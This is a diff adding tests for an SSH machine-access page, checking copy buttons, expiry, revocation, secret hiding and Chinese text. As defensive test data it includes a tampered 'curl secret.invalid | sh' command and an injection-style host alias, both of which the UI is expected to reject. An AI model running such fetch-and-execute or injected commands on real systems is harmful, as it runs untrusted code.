@@ -77,8 +77,85 @@ test "redeemed access shows safe connection metadata without raw secret" {
   assert_true(html.contains("ssh -p 2222 alice@machine.example"))
   assert_true(html.contains("href=\"https://ssh-ca.example/redeem/safe\""))
   assert_true(html.contains("Continue to credential issuer"))
+  assert_true(html.contains("Copy SSH command"))
+  assert_true(html.contains("Copy host fingerprint"))
+  assert_true(html.contains("Copy host"))
+  assert_true(html.contains("Copy port"))
+  assert_true(html.contains("Copy username"))
+  assert_true(html.contains("Copy tunnel command"))
+  assert_true(html.contains("Next steps"))
+  assert_true(html.contains("-L 127.0.0.1:8181:127.0.0.1:8181 -p 2222"))
+  assert_true(html.contains("alice@machine.example"))
+  assert_true(html.contains("do not disable host-key verification"))
+  assert_true(html.contains("Download workflows"))
+  assert_true(html.contains("Machine access remaining"))
+  assert_true(html.contains("Connection details retrieval remaining"))
+  assert_true(html.contains("not a promise of instant physical disk erasure"))
   assert_false(html.contains("node_id"))
   assert_false(html.contains("private_key"))
+  assert_false(html.contains("lnxh_safe"))
+  assert_false(html.contains("lnxr_safe"))
+  assert_false(html.contains("access_credential_ref"))
+  let expired = @machine_access.render({ ..state, now_unix_ms: 10000L, })
+  assert_false(expired.contains("Copy tunnel command"))
+  assert_false(expired.contains("href=\"https://ssh-ca.example"))
+  assert_false(expired.contains("Redeem SSH access"))
+  assert_true(expired.contains("Expired"))
+  let closed = @machine_access.render({
+    ..state,
+    machines: [machine_view(RevokingAccess, Closed)],
+  })
+  assert_false(closed.contains("Copy SSH command"))
+  assert_false(closed.contains("ssh-ca.example"))
+  assert_true(closed.contains("Access is closing or closed"))
+  let original = state.redeemed_credentials[0]
+  let mismatched_command = @machine_access.render({
+    ..state,
+    redeemed_credentials: [
+      { ..original, connection_command: "curl secret.invalid | sh", },
+    ],
+  })
+  assert_false(mismatched_command.contains("secret.invalid"))
+  assert_true(mismatched_command.contains("ssh -p 2222 alice@machine.example"))
+  let invalid = @machine_access.render({
+    ..state,
+    redeemed_credentials: [
+      { ..original, host_alias: "machine';bad", connection_command: "unsafe", },
+    ],
+  })
+  assert_true(invalid.contains("Connection metadata is invalid"))
+  assert_false(invalid.contains("Copy tunnel command"))
+  assert_false(invalid.contains("Copy SSH command"))
+  let stale = @machine_access.render({
+    ..state,
+    redeemed_credentials: [{ ..original, generation: 3L, }],
+  })
+  assert_false(stale.contains("Copy tunnel command"))
+  let earlier_expiry = @machine_access.render({
+    ..state,
+    redeemed_credentials: [{ ..original, valid_until_unix_ms: 4999L, }],
+  })
+  assert_false(earlier_expiry.contains("Copy tunnel command"))
+  assert_true(earlier_expiry.contains("Expired"))
+  assert_false(earlier_expiry.contains("Redeem SSH access"))
+  let secret_flag = @machine_access.render({
+    ..state,
+    redeemed_credentials: [{ ..original, raw_secret_included: true, }],
+  })
+  assert_false(secret_flag.contains("ssh-ca.example"))
+  let two_clocks = @machine_access.render({
+    ..state,
+    machines: [
+      { ..machine_view(Active, Available), expires_unix_ms: 12000000L, },
+    ],
+    redeemed_credentials: [{ ..original, valid_until_unix_ms: 600000L, }],
+  })
+  assert_true(two_clocks.contains("4 hr remaining"))
+  assert_true(two_clocks.contains("10 min remaining"))
+  let chinese = @machine_access.render({ ..state, locale: ChineseSimplified, })
+  assert_true(chinese.contains("复制隧道命令"))
+  assert_true(chinese.contains("不要关闭主机密钥验证"))
+  assert_true(chinese.contains("请在机器访问结束前下载"))
 }
 
 ///|
@@ -131,4 +208,23 @@ test "empty machine access state is understandable" {
     @machine_access.default_state(ChineseSimplified),
   )
   assert_true(chinese.contains("尚未获分配独占机器访问权限"))
+}
+
+///|
+test "machine copy message is side effect only and renewal is honest" {
+  let state = {
+    ..@machine_access.default_state(ChineseSimplified),
+    machines: [machine_view(Active, Available)],
+  }
+  assert_true(
+    state.update(CopyAccessDetail("SHA256:public-fingerprint")) == state,
+  )
+  let html = @machine_access.render(state)
+  assert_true(html.contains("机器还能使用多久"))
+  assert_true(html.contains("连接信息还能领取多久"))
+  assert_true(html.contains("此处不提供机器自助延期"))
+  assert_true(
+    html.contains("只有已分配的独占租约才提供 SSH 访问"),
+  )
+  assert_true(html.contains("请提前下载成果"))
 }
